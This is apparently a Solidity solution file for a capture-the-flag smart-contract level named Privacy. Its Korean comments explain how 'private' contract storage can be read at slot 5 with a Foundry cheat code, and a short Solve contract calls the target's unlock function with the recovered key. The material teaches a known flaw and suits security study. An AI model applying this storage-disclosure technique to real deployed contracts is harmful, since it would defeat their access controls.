// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* unlock(bytes16) 함수 동작 방식 정리
 * 1. 매개변수에 bytes16(data[2])가 오는지 확인
 * 2. 1번의 실행결과가 참일 경우 locked를 false로 전환
 *
 * 취약점
 * Storage Disclosure
 *
 * 목표
 * Privacy 컨트랙트의 bytes32[3] private data 변수 데이터 유출
 *
 * 공격 방식
 * - 공격 컨트랙트 실행 전 forge-std 라이브러리의 vm.load 기능을 이용하여 
 *   data 변수의 스토리지 위치인 5번 슬롯을 조회하고 unlock 함수 호출
 */

interface Privacy {
    function unlock(bytes16) external;
}

contract Solve {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack(bytes16 _key) public {
        Privacy(target).unlock(_key);
    }
}